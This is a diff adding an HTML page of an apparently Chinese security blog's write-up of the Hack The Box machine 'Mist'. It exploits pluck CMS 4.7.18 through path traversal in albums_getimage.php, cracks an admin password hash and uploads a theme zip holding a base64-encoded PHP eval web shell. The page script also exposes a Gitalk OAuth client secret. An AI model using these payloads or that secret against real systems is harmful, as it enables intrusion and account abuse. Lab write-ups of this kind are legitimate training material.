@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>HTB - Mist | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1717739446385">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="信息收集
+访问页面如下
+
+访问admin后台
+
+发现CMS框架版本：pluck 4.7.18
+主页的URL形式感觉可能有任意文件读取，发现被过滤。
+
+查看官方github上的issue，刚好有人提交了最新的漏洞信息。
+https://git..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1717739446385" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">HTB - Mist</h2>
+            <div class="post-date">2024-04-02</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="信息收集">信息收集</h1>
+<p>访问页面如下<br>
+<img src="https://fallingskies22.github.io/post-images/1712054325214.png" alt="" loading="lazy"></p>
+<p>访问admin后台<br>
+<img src="https://fallingskies22.github.io/post-images/1712054429776.png" alt="" loading="lazy"></p>
+<p>发现CMS框架版本：<code>pluck 4.7.18</code></p>
+<p>主页的URL形式感觉可能有任意文件读取，发现被过滤。<br>
+<img src="https://fallingskies22.github.io/post-images/1712054519756.png" alt="" loading="lazy"></p>
+<p>查看官方github上的issue，刚好有人提交了最新的漏洞信息。<br>
+https://github.com/pluck-cms/pluck/issues/123<br>
+下载漏洞草案信息。<br>
+https://github.com/pluck-cms/pluck/files/14239298/Borrador_aviso_CVE.docx</p>
+<p>看到描述上说有相对路径穿越漏洞，但只能读取当前目录和子目录文件。</p>
+<p>查看另一个issue，写的很清楚，<br>
+https://github.com/pluck-cms/pluck/issues/122</p>
+<h1 id="漏洞利用">漏洞利用</h1>
+<p>漏洞点位于<code>albums_getimage.php</code><br>
+payload</p>
+<pre><code>http://10.10.11.17/data/modules/albums/albums_getimage.php?image=mist.php
+</code></pre>
+<p><img src="https://fallingskies22.github.io/post-images/1712057362872.png" alt="" loading="lazy"><br>
+能够读取目录<code>/data/settings/modules/albums/</code>下的文件<br>
+这个目录下刚好有一个<code>admin_backup.php</code>里面存有password<br>
+<img src="https://fallingskies22.github.io/post-images/1712057451119.png" alt="" loading="lazy"></p>
+<p>payload</p>
+<pre><code>http://10.10.11.17/data/modules/albums/albums_getimage.php?image=admin_backup.php
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1712057576040.png" alt="" loading="lazy"></figure>
+<pre><code>c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e
+</code></pre>
+<p>hash解密<br>
+直接上<a href="https://www.cmd5.com/">cmd5</a> 充了钱就是狂👊<br>
+接出来密码是<code>lexypoo97</code></p>
+<p>使用密码登录后台</p>
+<p>后台可以getshell，<a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Pluck%20cms/Pluck%20CMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_4">参考文章</a></p>
+<p>在安装主题处，上传info.zip，info.zip内有info.php。<br>
+再返回主题页面<br>
+<img src="https://fallingskies22.github.io/post-images/1712486159732.png" alt="" loading="lazy"></p>
+<p>info.php</p>
+<pre><code class="language-php">&lt;?php
+file_put_contents('x.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydza3knXSk7Pz4='));
+?&gt;
+</code></pre>
+<p>然后使用蚁剑连接shell</p>
+<pre><code>http://10.10.11.17/x.php
+sky
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/thinkphp323fan-xu-lie-hua-lian-fen-xi/">
+                  <h3 class="post-title">
+                    [ThinkPHP3.2.3]反序列化链分析
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
